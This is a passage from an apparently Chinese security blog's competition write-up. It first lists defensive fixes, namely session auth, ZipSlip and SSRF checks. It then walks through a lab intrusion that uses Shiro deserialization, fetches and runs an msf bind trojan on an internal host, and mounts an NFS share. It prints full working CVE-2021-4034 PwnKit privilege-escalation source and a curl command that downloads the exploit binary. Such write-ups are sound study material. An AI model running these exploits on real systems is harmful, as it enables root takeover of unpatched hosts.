+<p>充分FIX:</p>
+<p><strong>改为 Flask Session</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">current_user</span>() -&gt; <span class="type">Optional</span>[<span class="built_in">str</span>]:</span><br><span class="line">    user = flask.session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> user <span class="keyword">if</span> <span class="built_in">isinstance</span>(user, <span class="built_in">str</span>) <span class="keyword">and</span> user <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login_required</span>(<span class="params">view</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrapped</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> is_logged_in():</span><br><span class="line">            next_url = flask.request.full_path <span class="keyword">if</span> flask.request.query_string <span class="keyword">else</span> flask.request.path</span><br><span class="line">            <span class="keyword">return</span> flask.redirect(flask.url_for(<span class="string">&quot;login&quot;</span>, <span class="built_in">next</span>=next_url))</span><br><span class="line">        <span class="keyword">return</span> view(*args, **kwargs)</span><br><span class="line">    wrapped.__name__ = view.__name__</span><br><span class="line">    <span class="keyword">return</span> wrapped</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> hmac.compare_digest(legacy_double_md5(password), LEGACY_ADMIN_PASSWORD_HASH):</span><br><span class="line">            flask.session.clear()</span><br><span class="line">            flask.session[<span class="string">&#x27;user&#x27;</span>] = username</span><br><span class="line">            <span class="keyword">return</span> flask.redirect(next_url)</span><br></pre></td></tr></table></figure>
+<p><strong>ZipSlip 防护</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">target = (dest_dir / name).resolve()</span><br><span class="line"><span class="keyword">if</span> os.path.commonpath([<span class="built_in">str</span>(dest_dir), <span class="built_in">str</span>(target)]) != <span class="built_in">str</span>(dest_dir):</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;ZipSlip blocked&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p><strong>禁止绝对路径</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> name.startswith(<span class="string">&quot;/&quot;</span>) <span class="keyword">or</span> (<span class="built_in">len</span>(name) &gt;= <span class="number">2</span> <span class="keyword">and</span> name[<span class="number">1</span>] == <span class="string">&quot;:&quot;</span>):</span><br></pre></td></tr></table></figure>
+<p><strong>禁止符号链接</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_zipinfo_is_symlink</span>(<span class="params">info</span>):</span><br><span class="line">    <span class="keyword">return</span> stat.S_ISLNK(info.external_attr &gt;&gt; <span class="number">16</span>)</span><br></pre></td></tr></table></figure>
+<p><strong>限制 zip 文件数量</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MAX_PLUGIN_FILES = <span class="number">128</span></span><br></pre></td></tr></table></figure>
+<p><strong>限制 zip 总大小</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AX_PLUGIN_TOTAL_SIZE = <span class="number">5</span> * <span class="number">1024</span> * <span class="number">1024</span></span><br></pre></td></tr></table></figure>
+<p><strong>SSRF 漏洞修复</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_host_is_public</span>(<span class="params">hostname: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    lowered = (hostname <span class="keyword">or</span> <span class="string">&quot;&quot;</span>).lower()</span><br><span class="line">    <span class="keyword">if</span> lowered <span class="keyword">in</span> &#123;<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;localhost.localdomain&quot;</span>&#125;:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        addrinfos = socket.getaddrinfo(hostname, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">except</span> OSError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    ips = &#123;ai[<span class="number">4</span>][<span class="number">0</span>] <span class="keyword">for</span> ai <span class="keyword">in</span> addrinfos <span class="keyword">if</span> ai <span class="keyword">and</span> ai[<span class="number">4</span>]&#125;</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> ips:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> ip_str <span class="keyword">in</span> ips:</span><br><span class="line">        ip_obj = ipaddress.ip_address(ip_str)</span><br><span class="line">        <span class="keyword">if</span> (</span><br><span class="line">            ip_obj.is_private</span><br><span class="line">            <span class="keyword">or</span> ip_obj.is_loopback</span><br><span class="line">            <span class="keyword">or</span> ip_obj.is_link_local</span><br><span class="line">            <span class="keyword">or</span> ip_obj.is_multicast</span><br><span class="line">            <span class="keyword">or</span> ip_obj.is_reserved</span><br><span class="line">        ):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>
+<p><strong>禁止重定向SSRF</strong></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">NoRedirectHandler</span>(urllib.request.HTTPRedirectHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">redirect_request</span>(<span class="params">self, req, fp, code, msg, headers, newurl</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">final_host = urllib.parse.urlparse(resp.geturl()).hostname</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> final_host <span class="keyword">or</span> <span class="keyword">not</span> _host_is_public(final_host):</span><br></pre></td></tr></table></figure>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_is_safe_next_url</span>(<span class="params">candidate: <span class="type">Optional</span>[<span class="built_in">str</span>]</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> candidate:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parsed = urllib.parse.urlparse(candidate)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">not</span> parsed.scheme <span class="keyword">and</span> <span class="keyword">not</span> parsed.netloc <span class="keyword">and</span> candidate.startswith(<span class="string">&quot;/&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p><strong><a target="_blank" rel="noopener" href="http://update.sh">update.sh</a>:</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"></span><br><span class="line">install -d /app/templates /var/www/html</span><br><span class="line"></span><br><span class="line">install -m 0644 index.py /app/index.py</span><br><span class="line">install -m 0644 templates/about.html /app/templates/about.html</span><br><span class="line">install -m 0644 html/phpinfo.php /var/www/html/phpinfo.php</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf /app/__pycache__</span><br><span class="line">pkill -f <span class="string">&quot;python3 /app/index.py&quot;</span> || <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2 id="wso2"><a class="markdownIt-Anchor" href="#wso2"></a> wso2</h2>
+<p>看java随记</p>
+<h2 id="isw0"><a class="markdownIt-Anchor" href="#isw0"></a> ISW0</h2>
+<h3 id="flag1shiro反序列化"><a class="markdownIt-Anchor" href="#flag1shiro反序列化"></a> flag1(Shiro反序列化)</h3>
+<p>首先Shiro反序列化工具打进去拿到shell，flag1就在根目录下</p>
+<h3 id="flag2pkexec提权"><a class="markdownIt-Anchor" href="#flag2pkexec提权"></a> flag2(pkexec提权)</h3>
+<p>当前权限是tomcat，需要提权</p>
+<blockquote>
+<p>我很想知道为什么蚁剑搜suid搜不出来</p>
+</blockquote>
+<p><img src="../images/640.webp" alt="图片" /></p>
+<p>发现有pkexec，可以想到CVE-2021-4034 pkexec提权</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ly4k/PwnKit">ly4k/PwnKit: Self-contained exploit for CVE-2021-4034 - Pkexec Local Privilege Escalation</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit</span><br><span class="line">chmod +x ./PwnKit</span><br><span class="line">./PwnKit # interactive shell</span><br><span class="line">./PwnKit &#x27;id&#x27; # single command</span><br></pre></td></tr></table></figure>
+<p>将exp文件上传，直接运行成功提权：</p>
+<p><img src="../images/640-17743370010005.webp" alt="图片" /></p>
+<p>flag2在/root目录下</p>
+<blockquote>
+<p>比较完整的：<br />
+Makefile:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">CFLAGS =-Wall</span><br><span class="line">TRUE=$(shell which <span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line">.PHONY: all</span><br><span class="line">all: pwnkit.so cve<span class="number">-2021</span><span class="number">-4034</span> gconv-modules gconvpath</span><br><span class="line"></span><br><span class="line">.PHONY: clean</span><br><span class="line">clean:</span><br><span class="line">	rm -rf pwnkit.so cve<span class="number">-2021</span><span class="number">-4034</span> gconv-modules GCONV_PATH =./</span><br><span class="line"></span><br><span class="line">gconv-modules:</span><br><span class="line">	echo <span class="string">&quot;module UTF-8// PWNKIT// pwnkit 1&quot;</span> &gt; $@</span><br><span class="line"></span><br><span class="line">.PHONY: gconvpath</span><br><span class="line">gconvpath:</span><br><span class="line">	mkdir -p GCONV_PATH =.</span><br><span class="line">	cp /usr/bin/<span class="literal">true</span> GCONV_PATH =./pppp:.</span><br><span class="line"></span><br><span class="line">pwnkit.so: pwnkit.c</span><br><span class="line">	$(CC) $(CFLAGS) --shared -fPIC -o $@ $&lt;</span><br></pre></td></tr></table></figure>
+<p>pwnkit.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gconv</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gconv_init</span><span class="params">(<span class="type">void</span> *step)</span> &#123;</span><br><span class="line">	setuid(<span class="number">0</span>); seteuid(<span class="number">0</span>);</span><br><span class="line">	setgid(<span class="number">0</span>); setegid(<span class="number">0</span>);</span><br><span class="line">	<span class="type">char</span> * <span class="type">const</span> args[] = &#123; <span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-pi&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">	<span class="type">char</span> * <span class="type">const</span> environ[] = &#123; <span class="string">&quot;PATH=/bin:/usr/bin:/sbin&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line">	execve(args[<span class="number">0</span>], args, environ);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>cve-2021-4034.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">	<span class="type">char</span> * <span class="type">const</span> args[] = &#123;</span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="type">char</span> * <span class="type">const</span> environ[] = &#123;</span><br><span class="line">		<span class="string">&quot;pwnkit.so:.&quot;</span>,</span><br><span class="line">		<span class="string">&quot;PATH=GCONV_PATH=.&quot;</span>,</span><br><span class="line">		<span class="string">&quot;SHELL=/bin/bashxxxx&quot;</span>,</span><br><span class="line">		<span class="string">&quot;CHARSET=PWNKIT&quot;</span>,</span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">return</span> execve(<span class="string">&quot;/usr/bin/pkexec&quot;</span>, args, environ);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们打包传到服务器上面去 <code>make</code> 一下就可以了，运行编译出来的程序即可提权成功。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./cve-2021-4034</span><br></pre></td></tr></table></figure>
+<p>最终，在 <code>/root/</code> 目录下拿到第二个 flag。</p>
+</blockquote>
+<h3 id="flag3"><a class="markdownIt-Anchor" href="#flag3"></a> flag3</h3>
+<p>ifconfig 发现存在内网</p>
+<p><a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/3375424/202603/3375424-20260324001921635-1880665605.png"><img src="../images/3375424-20260324001921635-1880665605.png" alt="assets/第三届长城杯半决赛WP-莫问/image-20260324001944557.png" /></a></p>
+<p>fscan 扫描内网，发现 <code>192.168.45.100</code>，存在 22、445 等端口</p>
+<p>在第一台机器 /root 目录下发现 agent elf 程序</p>
+<p>进行逆向，发现是一个远程控制木马，默认开放了 12345 端口，同时发现 192.168.45.100 也开放了 12345，怀疑就是 agent 程序</p>
+<p>有密钥 RCE_AUTH_2026</p>
+<p><a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/3375424/202603/3375424-20260324001921640-1344886076.png"><img src="../images/3375424-20260324001921640-1344886076.png" alt="assets/第三届长城杯半决赛WP-莫问/image-20260324001944554.png" /></a></p>
+<p>写 python 脚本尝试连接，经过测试，无回显，这里尝试生成 msf bind_tcp 木马，然后将木马通过蚁剑上传到第一台机器的 webapp 目录下，方便第二台通过 8080 端口连接下载，然后在第二台机器使用 curl 下载，修改权限并执行木马</p>
+<p><a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/3375424/202603/3375424-20260324001921622-248932869.png"><img src="../images/3375424-20260324001921622-248932869.png" alt="assets/第三届长城杯半决赛WP-莫问/image-20260324001944555.png" /></a></p>
+<p>成功使用 msf 连接到第二台机器的木马，发现直接为 root 权限，在根目录发现 flag</p>
+<p>同时发现存在 docker 服务，解释了为什么也存在 windows 的服务</p>
+<h3 id="flag4"><a class="markdownIt-Anchor" href="#flag4"></a> flag4</h3>
+<p>用fscan扫描的结果如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">192.168.45.100:88 open</span><br><span class="line">192.168.45.100:53 open</span><br><span class="line">192.168.45.100:22 open</span><br><span class="line">192.168.45.100:139 open</span><br><span class="line">192.168.45.100:135 open</span><br><span class="line">192.168.45.100:111 open</span><br><span class="line">192.168.45.100:464 open</span><br><span class="line">192.168.45.100:445 open</span><br><span class="line">192.168.45.100:389 open</span><br><span class="line">192.168.45.100:636 open</span><br><span class="line">192.168.45.100:2049 open</span><br><span class="line">192.168.45.100:3269 open</span><br><span class="line">192.168.45.100:3268 open</span><br><span class="line">192.168.45.100:12345 open</span><br><span class="line">192.168.45.100:20048 open</span><br><span class="line">192.168.45.100:34483 open</span><br><span class="line">192.168.45.100:49154 open</span><br><span class="line">192.168.45.100:49153 open</span><br><span class="line">192.168.45.100:49152 open</span><br><span class="line">192.168.45.100:57291 open</span><br></pre></td></tr></table></figure>
+<p>然后，我们看到一个奇特的端口 <code>2049</code>，打过春秋云境 Delivery 靶场的应该知道，这是 nfs 服务的端口，我们进行进一步的验证。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 showmount -e 192.168.45.100 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p>结果如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Export list for 192.168.45.100:</span><br><span class="line">/nfsdir *</span><br></pre></td></tr></table></figure>
+<p>我们挂载上述目录，既可拿到第四个 flag。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir /hack</span><br><span class="line">mount -t 192.168.45.100:/nfsdir /hack -o nolock</span><br><span class="line">cat /hack/flag</span><br></pre></td></tr></table></figure>
+<h2 id="isw1"><a class="markdownIt-Anchor" href="#isw1"></a> ISW1</h2>
+<h3 id="flag1"><a class="markdownIt-Anchor" href="#flag1"></a> flag1</h3>
+<p>首先，入口机的服务存在高权限的任意文件读取漏洞，我们读取 <code>/proc/self/cmdline</code> 可以发现，它在运行一个 server，这个估计是个 Pwn，但是时间有限，我们最终没有研究出来。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/root/pico/server 80</span><br></pre></td></tr></table></figure>
+<p>赛后复盘，学习一下大佬们的骚操作，发现这里其实还存在其他解法，直接将 <code>/dev/sda</code> 磁盘文件下载下来，直接开始取证！好家伙，原来今年的取证在这里！能想到这个思路的师傅也是天才</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" rel="tag">比赛复现</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/175637316152817563731618.jpg" data-sizes="auto" alt="PHP-opcache插件RCE" class="lazyload">
+          
+        
+        <a href="/2026/03/24/PHP-opcache%E6%8F%92%E4%BB%B6RCE/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            PHP-opcache插件RCE
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/175514388679175514388612.jpg" data-sizes="auto" alt="[Vulnhub靶机通关]Durian" class="lazyload">
+        
+      
+      <a href="/2026/03/18/%5BVulnhub%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%5DDurian/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          [Vulnhub靶机通关]Durian
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#intrabadge"><span class="toc-number">1.</span> <span class="toc-text"> IntraBadge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#break"><span class="toc-number">1.1.</span> <span class="toc-text"> break</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#jinja2%E7%BB%95%E8%BF%87sandboxedenvironmentcve-2025-27516"><span class="toc-number">1.1.1.</span> <span class="toc-text"> jinja2绕过SandboxedEnvironment(CVE-2025-27516)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mediadrive"><span class="toc-number">2.</span> <span class="toc-text"> MediaDrive</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#break-2"><span class="toc-number">2.1.</span> <span class="toc-text"> break</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fix"><span class="toc-number">2.2.</span> <span class="toc-text"> fix</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy_time"><span class="toc-number">3.</span> <span class="toc-text"> easy_time</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#break-3"><span class="toc-number">3.1.</span> <span class="toc-text"> break</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fix-2"><span class="toc-number">3.2.</span> <span class="toc-text"> fix</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wso2"><span class="toc-number">4.</span> <span class="toc-text"> wso2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#isw0"><span class="toc-number">5.</span> <span class="toc-text"> ISW0</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flag1shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">5.1.</span> <span class="toc-text"> flag1(Shiro反序列化)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag2pkexec%E6%8F%90%E6%9D%83"><span class="toc-number">5.2.</span> <span class="toc-text"> flag2(pkexec提权)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag3"><span class="toc-number">5.3.</span> <span class="toc-text"> flag3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag4"><span class="toc-number">5.4.</span> <span class="toc-text"> flag4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#isw1"><span class="toc-number">6.</span> <span class="toc-text"> ISW1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flag1"><span class="toc-number">6.1.</span> <span class="toc-text"> flag1</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
